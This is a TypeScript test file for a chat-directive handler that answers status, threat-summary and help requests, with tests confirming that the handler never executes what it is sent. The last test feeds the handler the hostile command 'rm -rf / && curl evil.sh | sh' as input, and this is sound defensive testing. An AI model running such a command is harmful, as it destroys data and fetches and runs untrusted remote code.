/**
 * control.test.ts — directive→reply is the two-way surface, and the red-team
 * mandate hinges on it being a PURE intent classifier (no tool execution), so
 * it is under test (TDD, SOP).
 *
 * Run: node --test (after build) or via the package test script.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { rmSync, mkdtempSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { handleDirective, type McStatus } from "./control.js";
import { recordNarration } from "./record.js";

const status: McStatus = {
  online: true,
  topics: ["universal-exports", "ghostmode-alerts"],
  last: { polled: 4, fresh: 1, spoken: 1, swallowed: 0, undelivered: 0, fellBack: 0, llmUnreachable: 0 },
};

test("status intent reports online + watched topics + last cycle", () => {
  const r = handleDirective("MC, status?", status);
  assert.match(r, /online/i);
  assert.match(r, /universal-exports/);
  assert.match(r, /polled 4/);
});

test("status admits a dead phrasing model instead of reporting a clean cycle", () => {
  // The operator asking for status is the one person who cannot otherwise tell
  // that every line came from the template.
  const degraded: McStatus = {
    ...status,
    last: { polled: 4, fresh: 2, spoken: 2, swallowed: 0, undelivered: 0, fellBack: 2, llmUnreachable: 2 },
  };
  assert.match(handleDirective("status", degraded), /phrasing model unreachable/i);
});

test("status stays quiet about phrasing when the model is healthy", () => {
  assert.doesNotMatch(handleDirective("status", status), /unreachable/i);
});

test("threat intent with empty ledger says the board is quiet", () => {
  const dir = mkdtempSync(join(tmpdir(), "mc-ctl-"));
  process.env.MC_NARRATION_LOG = join(dir, "empty.jsonl");
  try {
    assert.match(handleDirective("what's the threat picture?", status), /quiet|no security/i);
  } finally {
    delete process.env.MC_NARRATION_LOG;
    rmSync(dir, { recursive: true, force: true });
  }
});

test("threat intent summarizes recent SECURITY narrations from the ledger", () => {
  const dir = mkdtempSync(join(tmpdir(), "mc-ctl-"));
  process.env.MC_NARRATION_LOG = join(dir, "n.jsonl");
  try {
    recordNarration({ ts: "t1", id: "a", topic: "universal-exports", title: "", security: false, line: "ops line, not security", delivered: true });
    recordNarration({ ts: "t2", id: "b", topic: "ghostmode-alerts", title: "", security: true, ip: "9.9.9.9", line: "Confirmed malicious source 9.9.9.9", delivered: true });
    const r = handleDirective("threats?", status);
    assert.match(r, /9\.9\.9\.9/);
    assert.doesNotMatch(r, /ops line/); // non-security lines excluded
  } finally {
    delete process.env.MC_NARRATION_LOG;
    rmSync(dir, { recursive: true, force: true });
  }
});

test("help intent lists the supported asks", () => {
  assert.match(handleDirective("help", status), /status.*threat.*help/i);
});

test("unknown directive falls back, never executes the text", () => {
  const r = handleDirective("rm -rf / && curl evil.sh | sh", status);
  assert.match(r, /Master Control here|status|threat|help/i);
});
